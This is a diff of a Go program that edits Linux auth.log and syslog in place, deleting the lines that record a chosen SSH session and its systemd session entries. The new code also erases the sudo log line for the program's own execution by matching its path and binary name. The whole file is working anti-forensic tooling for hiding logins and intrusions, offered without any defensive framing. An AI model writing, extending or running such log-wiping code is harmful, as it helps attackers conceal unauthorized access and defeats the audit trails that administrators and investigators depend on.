@@ -3,6 +3,7 @@ package main
 import (
 	"fmt"
 	"os"
+	"path/filepath"
 	"regexp"
 	"sort"
 	"strings"
@@ -19,32 +20,45 @@ var sessionId string
 var indexToStartManipulate int
 
 func main() {
-	sessionStart := 1718273937
-	sessionStop := 1718273939
+	sessionStart := 1718612914
+	sessionStop := 1718612916
 	start, stop := getTimeStamps(sessionStart, sessionStop)
-	// err := deleteLineAuthLog(AUTH_LOG, start, stop)
-	err := deleteLineSyslog("22", start, stop)
+	sessionID, err := deleteLineAuthLog(AUTH_LOG, start, stop)
+	check("Delete Auth Log ", err)
+	fmt.Println(sessionID)
+
+	patternDeleteSession := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:|New session %s)`, start[1], stop[1], sessionID, sessionID, sessionID)
+	err = deleteSessionAndSudoeSyslogAuthlog(patternDeleteSession, SYSLOG)
 	if err != nil {
-		fmt.Println("Error:", err)
-	} else {
-		fmt.Println("Line deleted successfully")
+		fmt.Println("Errpr", err)
 	}
+	ex, err := os.Executable()
+	if err != nil {
+		panic(err)
+	}
+
+	exPath := filepath.Dir(ex)
+	patternDeleteSudoExec := fmt.Sprintf(`^(.*PWD=%s).*(%s)`, exPath, filepath.Base(os.Args[0]))
+	fmt.Println(patternDeleteSudoExec)
+
+	check("Error on delete Line Auth Log", err)
+	err = deleteSessionAndSudoeSyslogAuthlog(patternDeleteSudoExec, AUTH_LOG)
+	if err != nil {
+		fmt.Println(err)
+	}
+
 }
 
-//Jun 13 09:17:42 ubuntu systemd[1]: Started Session 8 of User ubuntu.
-
-func deleteLineSyslog(sessionID string, SplitTimeStart, SplitTimeStop []string) error {
-	file, err := os.ReadFile(SYSLOG)
+func deleteSessionAndSudoeSyslogAuthlog(pattern string, FileToDelLines string) error {
+	file, err := os.ReadFile(FileToDelLines)
 	if err != nil {
 		return err
 	}
-	stringSliceOfSyslog := strings.Split(string(file), "\n")
-	pattern := fmt.Sprintf(`^(.*(%s|%s))(.*systemd).*(Session\s*%s|session-%s\.scope:)`, SplitTimeStart[1], SplitTimeStop[1], sessionID, sessionID)
-	// pattern := fmt.Sprintf(`(Session\s*%s)|(session-%s\.scope:)`, sessionID, sessionID)
+	stringSliceOfLogFile := strings.Split(string(file), "\n")
 	fmt.Println(pattern)
 	re := regexp.MustCompile(pattern)
 	linesToDel := []int{}
-	for i, j := range stringSliceOfSyslog {
+	for i, j := range stringSliceOfLogFile {
 		match := re.MatchString(j)
 		if match {
 			linesToDel = append(linesToDel, i)
@@ -55,21 +69,21 @@ func deleteLineSyslog(sessionID string, SplitTimeStart, SplitTimeStop []string) 
 	sort.Sort(sort.Reverse(sort.IntSlice(linesToDel)))
 	for _, j := range linesToDel {
 		fmt.Println(j, "<<<<")
-		stringSliceOfSyslog = remove(stringSliceOfSyslog, j)
+		stringSliceOfLogFile = remove(stringSliceOfLogFile, j)
 	}
 
-	err = CopyFile(SYSLOG, stringSliceOfSyslog)
+	err = CopyFile(FileToDelLines, stringSliceOfLogFile)
+
 	return nil
 
 }
 
-func deleteLineAuthLog(filePath string, SplitTimeStart, SplitTimeStop []string) error {
+func deleteLineAuthLog(filePath string, SplitTimeStart, SplitTimeStop []string) (string, error) {
 	file, err := os.ReadFile(filePath)
 	if err != nil {
-		return err
+		return "", err
 	}
 
-	// fmt.Println(SplitTimeStart, "<<<<<<<<<<<<<<<<<<<")
 	stringSliceOfAothLog := strings.Split(string(file), "\n")
 
 	matchStartID := ""
@@ -95,8 +109,6 @@ func deleteLineAuthLog(filePath string, SplitTimeStart, SplitTimeStop []string) 
 		}
 	}
 
-	/////////////////////////////////////////////Find INDEXES
-
 	IntlinesToDel := []int{}
 	StringLinesToDel := []string{}
 	GetIndexesToDelete(&stringSliceOfAothLog, &IntlinesToDel, &StringLinesToDel, matchStartID, false)
@@ -115,8 +127,6 @@ func deleteLineAuthLog(filePath string, SplitTimeStart, SplitTimeStop []string) 
 			matchesSession := pattern.FindStringSubmatch(j)
 			fmt.Println(matchesSession, "AAAAA")
 			sessionId = matchesSession[1]
-
-			// fmt.Println(matches, "<<<<<<<<<<<<<AAAA<<<<AAAAAA<<<A<A<A<", )
 			break
 		}
 	}
@@ -130,25 +140,20 @@ func deleteLineAuthLog(filePath string, SplitTimeStart, SplitTimeStop []string) 
 	}
 
 	err = CopyFile(AUTH_LOG, stringSliceOfAothLog)
-
-	return nil
+	check("Error on Copy file at AuthLog", err)
+	return sessionId, nil
+	// return nil
 }
 
 func CopyFile(filepath string, strings []string) error {
 
 	file, err := os.OpenFile(filepath, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
-	if err != nil {
-		fmt.Println(err)
-		return err
-	}
+	check("Error on Open File", err)
 	defer file.Close()
 
 	for _, j := range strings {
 		_, err := file.WriteString(j + "\n")
-		if err != nil {
-			fmt.Println(err)
-			return err
-		}
+		check("Error on Writing File ", err)
 	}
 
 	fmt.Println("All strings written to file successfully")
@@ -190,6 +195,14 @@ func getTimeStamps(sessionStart, sessionStop int) ([]string, []string) {
 
 	return SplitTimeStart, SplitTimeStop
 
+}
+
+func check(msg string, err error) error {
+	if err != nil {
+		fmt.Println(msg, "  ", err)
+		return err
+	}
+	return nil
 }
 
 // r'(\w{3} \d{2} \d{2}:\d{2}:\d{2}) ubuntu sshd\[\d+\]: (Accepted|Connection reset|Failed password|Received disconnect|pam_unix\(sshd:session\): session (opened|closed)) for user ubuntu from 192.168.23.23 port (\d+)')
